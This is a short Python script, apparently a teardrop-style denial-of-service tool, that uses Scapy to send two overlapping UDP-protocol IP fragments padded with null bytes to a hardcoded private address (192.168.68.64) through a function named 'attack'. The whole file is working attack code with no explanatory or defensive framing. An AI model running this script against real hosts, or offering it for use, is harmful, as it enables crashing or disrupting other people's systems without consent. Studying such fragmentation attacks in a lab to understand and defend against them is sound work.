from scapy.all import *

def attack(target_ip):
    size = 1000
    offset = 5
    data = "\x00"*size

    i = IP(dst=target_ip, flags="MF", proto=17)
    j = IP(dst=target_ip, flags=0, proto=17, frag=offset)

    send(i/data)
    send(j/data)


if __name__ == "__main__":
    attack("192.168.68.64")